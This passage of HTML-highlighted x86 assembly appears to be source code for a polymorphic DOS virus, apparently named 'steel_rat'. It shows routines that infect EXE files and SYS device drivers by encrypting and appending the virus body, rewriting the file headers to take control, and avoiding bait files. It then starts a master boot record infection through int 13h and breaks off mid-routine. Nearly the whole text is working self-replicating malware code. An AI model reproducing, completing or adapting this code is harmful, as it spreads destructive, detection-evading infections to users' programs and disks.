    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">; To the end of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">CloseExe</span><span class="sc0">             </span><span class="sc1">; Overlay(s) Present...</span><span class="sc0">
    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Add partial page length</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">CloseExe</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">CHost</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">; Calculate Exe Entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">][</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Look if there in</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">               </span><span class="sc1">; IP any paragraphs</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; Dx = Paragraphs in IP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">][</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Add CS</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">][</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Add header size</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoDivCS</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">NoDivCS</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; Add Ip</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CryptHost</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc0">          </span><span class="sc1">; Store old SS,SP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ss</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Skip CheckSum</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old</span><span class="sc0">           </span><span class="sc1">; Store old Ip</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">       </span><span class="sc1">; Multiply higher word of offset</span><span class="sc0">
                </span><span class="sc1">; by 4096 (65536*x/16 = x*4096)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Sub header size</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get old Cs</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; Sub Old,Current seg</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; Store it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">; Make New Cx = Dx</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; Setup SS</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Setup SP</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Setup New Ip</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">host</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; Host - Exe</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">SlowPoly</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MakeSlow</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">steel_rat</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">      </span><span class="sc1">; Encrypt Us</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">smm</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FLen</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Store new length</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; Calculate number of pages</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">    </span><span class="sc1">; Add number of pages</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0">    </span><span class="sc1">; Add size of partial page</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">512</span><span class="sc0">   </span><span class="sc1">; Partial page &gt; 512</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ItOk</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Increase Pagenum</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">512</span><span class="sc0">   </span><span class="sc1">; Sub partial page size,by 512</span><span class="sc0">
</span><span class="sc5">ItOk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Write us</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; To the beginning of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">      </span><span class="sc1">; Write new Exe header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mark</span><span class="sc0">           </span><span class="sc1">; Mark file</span><span class="sc0">

</span><span class="sc5">Close_Exe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">          </span><span class="sc1">; Close file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

</span><span class="sc5">Exe_Infect_Done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">resta</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_exe</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">infect_sys</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">savea</span><span class="sc0">          </span><span class="sc1">; Drop attributes</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">            </span><span class="sc1">; Open file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">FileOpened</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Sys_Infect_Done</span><span class="sc0">
</span><span class="sc5">FileOpened</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckInf</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoInfectedSys</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Sys_Close_File</span><span class="sc0">
</span><span class="sc5">NoInfectedSys</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">NoCBait</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckBait</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SysOk</span><span class="sc0">
</span><span class="sc9">EndiF</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Sys_Close_File</span><span class="sc0">
</span><span class="sc5">SysOk</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Dos</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">MinCom</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Sys_Close_File</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">          </span><span class="sc1">; Load header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">            </span><span class="sc1">; To the end of driver</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">60000</span><span class="sc4">-</span><span class="sc5">Vlen</span><span class="sc0">       </span><span class="sc1">; More then one segment ?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">Sys_Close_File</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">host</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Host = Sys</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">SlowPoly</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MakeSlow</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">steel_rat</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">smm</span><span class="sc0">            </span><span class="sc1">; Crypt us</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Flen</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Store our new size</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Write us</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; write new offset of interrupt</span><span class="sc0">
                    </span><span class="sc1">; procedure</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Point to interrupt</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Write it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mark</span><span class="sc0">
    
</span><span class="sc5">Sys_Close_File</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">          </span><span class="sc1">; Close file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

</span><span class="sc5">Sys_infect_done</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">resta</span><span class="sc0">          </span><span class="sc1">; Restore attributes</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_sys</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">MbrInfect</span><span class="sc0">
</span><span class="sc5">infect_mbr</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; Infect MBR</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Windoze</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; There is windows in a system ?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">LetsInfectMBR</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoInfectMBR</span><span class="sc0">
</span><span class="sc5">LetsInfectMBr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">            </span><span class="sc1">; Lets read current MBR</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">Free</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">iCheck</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Free</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">  </span><span class="sc1">; First is NOP ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">InfectItq</span><span class="sc0">           </span><span class="sc1">; If no - lets infect MBR</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoInfectMbr</span><span class="sc0">
</span><span class="sc5">InfectItq</span><span class="sc4">:</span><span class="sc0">
